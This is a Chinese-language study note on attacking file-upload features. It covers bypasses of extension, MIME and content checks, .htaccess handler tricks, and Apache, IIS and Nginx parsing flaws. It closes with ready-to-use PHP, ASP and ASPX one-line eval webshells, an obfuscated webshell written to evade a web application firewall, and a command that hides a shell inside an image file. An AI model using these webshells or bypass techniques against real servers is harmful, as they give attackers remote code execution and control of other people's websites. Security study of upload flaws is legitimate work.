# 文件上传 笔记


## 常规bypass

绕JS,Server MIME Check：抓包  
绕服务器扩展名检测：大小写，名单疏忽，特殊文件名，0x00，.htaccess文件攻击
绕文件内容检测

### 特殊文件名

1. 上传不符合windows文件命名规则的文件名

```txt
　　test.asp.
　　test.asp(空格)
　　test.php:1.jpg
　　test.php::$DATA
　　shell.php::$DATA…….
```

会被windows系统自动去掉不符合规则符号后面的内容。

2. linux下后缀名大小写
在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。

### 0x00绕过

Name = getname(http requests)//假如这一步获取到的文件名是dama.asp .jpg  
Type = gettype(name)//而在该函数中，是从后往前扫描文件扩展名，所以判断为jpg文件  
If(type == jpg)  
SaveFileToPath(UploadPath.name , name)//但在这里却是以0x00作为文件名截断，最后以dama.asp存入路径里  

### .htaccess  

该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。该文件的写法如下:

```xml
<FilesMatch "_php.gif">  
 SetHandler application/x-httpd-php  
</FilesMatch>  
```

保存为.htaccess文件。该文件的意思是，只要遇到文件名中包含有”_php.gif”字符串的，统一按照php文件来执行。该文件在Apache里默认是启用的，然后就可以上传一个带一句话木马的文件，例如a_php.gif，会被当成php执行。

### 文件内容检测

1. 文件幻数检测：  

>JPG ： FF D8 FF E0 00 10 4A 46 49 46  
GIF ： 47 49 46 38 39 61 (GIF89a)  
PNG： 89 50 4E 47  

绕过方法：  
在文件幻数后面加上自己的一句话木马就行了。  

2. 文件相关信息检测：

一般就是检查图片文件的大小，图片文件的尺寸之类的信息。  
绕过方法：  
伪造好文件幻数，在后面添加一句话木马之后，再添加一些其他的内容，增大文件的大小。  

3. 文件加载检测：

一般是调用API或者函数去进行文件加载测试，常见的是图像渲染测试，再变态一点的甚至是进行二次渲染。  
绕过方法：  
针对渲染加载测试：代码注入绕过  
针对二次渲染测试：攻击文件加载器  
通常，对于文件内容检查的绕过，就是直接用一个结构完整的文件进行恶意代码注入即可。

## WebServer解析漏洞

[学习链接](https://thief.one/2016/09/21/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/)

### Apache解析漏洞

一个文件名为xxx.x1.x2.x3的文件（例如：index.php.fuck）， Apache会从x3的位置往x1的位置开始尝试解析，如果x3不属于Apache能解析的扩展名，那么Apache会尝试去解析x2的位置，这样一直往前尝试，直到遇到一个能解析的扩展名为止。

### IIS解析漏洞

#### IIS6.0

1. 文件类型
正常：www.xxx.com/logo.jpg  
触发漏洞：www.xxx.com/logo.asp;.jpg  
按照Ⅰ来访问logo.jpg，文件会被当成是jpg图片来解析，想办法，能够按照Ⅱ来访问logo.jpg，文件就会被当成asp文件来处理。（如果IIS支持PHP，那么logo.php;.jpg也会被当成PHP文件执行）  

2. 文件夹类型
正常：www.xxx.com/image/logo.jpg  
触发漏洞：www.xxx.com/image.asp/logo.jpg  
按照Ⅰ来访问logo.jpg，文件会被当成是jpg图片来解析，想办法，能够按照Ⅱ来访问logo.jpg，文件就会被当成asp文件来处理。（如果IIS支持PHP，那么image.php文件夹下的文件也会被当做PHP文件解析。）  

#### IIS7.0以上

IIS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串”/任意文件名.php”就会按照php的方式去解析。（例如：webshell.jpg/x.php）  
IIS7.0(Win2008R1+IIS7.0)  
IIS7.5(Win2008R2+IIS7.5)  
IIS的解析漏洞不像Apache那么模糊，针对IIS6.0，只要文件名不被重命名基本都能搞定。这里要注意一点，对于”任意文件名/任意文件名.php”这个漏洞其实是出现自php-cgi 的漏洞， 所以其实跟IIS自身是无关的。  

#### Nginx解析漏洞

目前Nginx主要有这两种漏洞：
a.一个是对任意文件名，在后面添加”/任意文件名.php”的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。
b.低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。
Nginx0.5.
Nginx0.6.
Nginx0.7. <= 0.7.65
Nginx0.8. <= 0.8.37
对于”任意文件名/任意文件名.php”这个漏洞其实是出现自php-cgi的漏洞，所以其实跟Nginx自身是无关的。

## 一句话

php  
`<?php @eval($_POST[‘lzx’]);?>`  
`<?php  $a = "a"."s"."s"."e"."r"."t";$a($_POST[cc]);?>`  
asp  
`<% eval request(“lzx”)%>`  
aspx  
`<%@ Page Language="Jscript"%><%eval(Request.Item["lzx"],"unsafe");%>`  
过狗

```php
<?php 
  $mt="JF9QT1N"; 
  $ojj="QGV2YWwo";
  $hsa="UWydpMGle";
  $fnx="5BeSleleddKTs=";
  $zk = str_replace("d","","sdtdrd_redpdldadcde");
  $ef = $zk("z", "", "zbazsze64_zdzeczodze");  
  $dva = $zk("p","","pcprpepaptpe_fpupnpcptpipopn");
  $zvm = $dva('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx)));
  $zvm();
?>
```

## 图片木马

```shell
copy /b uplode.jpg+shell.php
```
